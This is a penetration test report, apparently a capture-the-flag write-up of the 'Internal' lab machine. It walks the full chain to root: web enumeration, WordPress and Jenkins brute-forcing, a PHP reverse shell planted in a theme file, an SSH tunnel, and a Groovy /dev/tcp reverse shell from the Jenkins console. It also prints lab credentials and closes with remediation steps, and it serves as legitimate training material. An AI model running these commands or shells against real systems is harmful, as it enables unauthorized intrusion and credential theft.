# 🛡️ Penetration Test Report: internal.thm

**Target:** `internal.thm` (10.201.35.3)
**Assessment Date:** November 2025
**Tested By:** Security Team
**Report Version:** 5.5 (HackTricks Alignment - Final Script Detail Added)

---

## 1. Executive Summary

The security assessment of the target environment resulted in a **full root system compromise**. The overall risk rating is **CRITICAL**. The attack chain was enabled by predictable **weak credentials** and the catastrophic failure to protect the **root password**, which was stored in cleartext on the filesystem.

Immediate and urgent remediation is required, focusing on implementing strong MFA, secure password vaulting, and strict file permission controls across all systems.

### Summary of Findings by Severity

| ID | Finding Title | Severity | Exploit Vector |
| :--- | :--- | :--- | :--- |
| **C-01** | Cleartext Root Password in Plain File | **CRITICAL** | Post-Exploitation Looting |
| **C-02** | Sensitive Data Disclosure (User Credentials) | **CRITICAL** | Improper File Permissions & Database Misconfiguration |
| **H-01** | Weak Credentials for WordPress (Admin) | **HIGH** | External Brute-Force Attack |
| **H-02** | Weak Credentials for Internal Jenkins Service | **HIGH** | Internal Lateral Brute-Force |
| **M-01** | Outdated and Insecure WordPress Version (5.4.2) | **MEDIUM** | Known Public Vulnerabilities |

---

## 2. Technical Methodology and Commands Log (HackTricks Alignment)

This section details the steps taken during the engagement, mapped directly to the requested pentesting methodology.

### 1- Discovering Assets of the company / 3- Port Scan - Service discovery

**Goal:** Identify all reachable services, their versions, and applications running on the target IP.

| Step | Objective | Command Used | Key Finding |
| :--- | :--- | :--- | :--- |
| **Service & Port Scan** | Identify open ports and service versions. | `nmap -sC -sV -A 10.201.35.3` | **Open Ports:** 22 (SSH) and 80 (HTTP). Apache httpd 2.4.29 identified. |
| **Directory Fuzzing** | Find hidden web paths. | `gobuster dir -u http://10.201.35.3 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Discovered paths: `/blog/` (WordPress) and `/phpmyadmin/`. |
| **CMS Enumeration** | Determine WordPress details. | `wpscan --url http://internal.thm/blog/` | Identified **WordPress version 5.4.2** (M-01) and the user **Admin**. |

---

### 4- Searching service version exploits / 5- Pentesting Services

**Goal:** Exploit known weaknesses in the identified services, primarily targeting the publicly exposed WordPress application.

| Finding ID | Technique | Command Used | Result and Impact |
| :--- | :--- | :--- | :--- |
| **H-01 / 5.2 Brute-Forcing services** | **Brute-Force Attack** | `wpscan --url http://internal.thm/blog/wp-login.php --usernames Admin --passwords /usr/share/wordlists/rockyou.txt` | Valid Admin credentials found: **`Admin:my2boys`**. |
| **H-01 / 7- Getting Shell** | **Listener Setup** | `nc -lvnp 4444` | Set up listener to catch the reverse shell. |
| **H-01 / 7- Getting Shell** | **Reverse Shell Injection** | *Used the **`pentestmonkey/php-reverse-shell.php`** payload, modified for ATTACKING\_IP and PORT, and injected into a writable theme file (e.g., functions.php).* | This provided a low-privileged shell as the **`www-data`** user upon accessing the compromised file. |

---

### 11- POST / 11.1 - Looting (Lateral Movement Prep)

**Goal:** Collect information immediately upon gaining access, specifically searching for credentials and internal infrastructure data.

| Finding ID | Technique | Command Used | Result and Impact |
| :--- | :--- | :--- | :--- |
| **C-02** | **Credential File Search** | `find / -name "*save*"` | Discovered the critical path: `/opt/wp-save.txt`. |
| **C-02** | **Credential Retrieval (Aubreanna)** | `www-data@internal:/opt$ cat wp-save.txt` | **Evidence:** `Bill, Aubreanna needed these credentials for something later. Let her know you have them and where they are. aubreanna:bubb13guM!@#123` |
| **C-02** | **Database Enumeration & Hash Retrieval** | `SELECT user_login, user_pass FROM wp_users;` | **Finding:** Recovered the WordPress Admin password hash: `admin:$P$BOFWK.UcwNR/tV/nZZvSA6j3bz/WIp/` (Vulnerable to offline cracking). |
| **Post-Ex** | **Internal Recon (Hidden Files)** | `aubreanna@internal:~$ cat jenkins.txt` | **Evidence:** `Internal Jenkins service is running on 172.17.0.2:8080` |

---

### 12 - Pivoting

**Goal:** Use the recovered credentials to gain a better shell (Lateral Movement) and establish a tunnel to access the internal network service.

| Finding ID | Technique | Command Used | Result and Impact |
| :--- | :--- | :--- | :--- |
| **C-02** | **Lateral SSH Pivot** | `ssh aubreanna@10.201.35.3` | Achieved a stable shell as user **`aubreanna`**. |
| **H-02** | **Network Tunnelling** | `ssh -L 8888:172.17.0.2:8080 aubreanna@10.201.35.3` | Created a local tunnel, making Jenkins accessible via `127.0.0.1:8888`. |
| **H-02 / 5.2 Brute-Forcing services** | **Internal Service Brute-Force** | `hydra 127.0.0.1 -s 8080 -V -f http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -l admin -P /usr/share/wordlists/rockyou.txt` | Jenkins Admin credentials found: **`admin:spongebob`**. |
| **H-02 / 7- Getting Shell** | **RCE via Script Console** | **Groovy Script Executed:** `r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()` | Achieved a shell as the **`jenkins`** user. |

---

### 10- Privilege Escalation

**Goal:** Escalate privileges from the `jenkins` user to the `root` user.

| Finding ID | Technique | Command Used | Result and Impact |
| :--- | :--- | :--- | :--- |
| **C-01 / 11.1 - Looting** | **Root Credential Discovery** | `cat notes.txt` | Discovered the final, catastrophic credential: **`root:tr0ub13guM!@#123`**. |
| **C-01 / 10.1- Local Privesc** | **Final Escalation** | `su root` | **Full System Compromise (Root Access) Achieved.** |
| **Post-Ex** | **Flag Retrieval** | `cat /root/root.txt` | Root Flag Retrieved. |

---

## 3. Remediation and Mitigation Plan

### Tactic A: Secure Credential Management (CRITICAL C-01 & C-02)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. Root Password Rotation** | Vault Integration | **Action:** Immediately rotate the root password and store it exclusively in a dedicated secret vault. **Command:** `passwd root` |
| **2. Secure File Deletion** | Secure Deletion | Locate and securely delete files containing cleartext passwords. **Command:** `shred -u /opt/wp-save.txt` **Command:** `shred -u /home/jenkins/notes.txt` |
| **3. PoLP Enforcement** | Access Control | Restrict the `www-data` user's read access to all non-web directories. **Command:** `chmod 700 /opt` (or specific ACLs) |
| **4. Database Security** | Access Control & Hashing | **Action:** Ensure the MySQL user running WordPress has minimal privileges. Verify all WordPress user passwords are properly salted and hashed. |
| **5. SSH Key-Only Access** | Key-Based Auth | Disable password login for SSH across all user accounts. **Command:** Edit `/etc/ssh/sshd_config`, set `PasswordAuthentication no`, and restart service. |

### Tactic B: Proactive Defense Against Brute Force (HIGH H-01 & H-02)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. Implement MFA** | Adaptive Authentication | **Action:** Deploy Multi-Factor Authentication (MFA) for WordPress and Jenkins. |
| **2. Login Rate Limiting** | Fail2Ban | Install and configure Fail2Ban to monitor logs and block brute-force IPs. **Command:** `sudo apt install fail2ban` **Command:** `sudo systemctl enable fail2ban` |
| **3. Enforce Strong Passwords** | Policy Management | **Action:** Mandate minimum 16-character passwords with complexity requirements across all systems. **Command:** *Update PAM or Active Directory policy.* |

### Tactic C: Patching and Hardening (M-01 & L-01)

| Remediation Step | Tachtiqque | Command/Action |
| :--- | :--- | :--- |
| **1. System Updates** | Automated Patching | Update all OS packages and services immediately. **Command:** `sudo apt update && sudo apt upgrade -y` |
| **2. WordPress Upgrade** | Application Patching | Update WordPress core. **Command:** *Use WP-CLI or the WordPress dashboard auto-updater.* |
| **3. Jenkins RCE Mitigation** | Feature Restriction | Disable the Groovy Script Console access for all non-essential administrators. **Action:** *Configure Jenkins security settings.* |
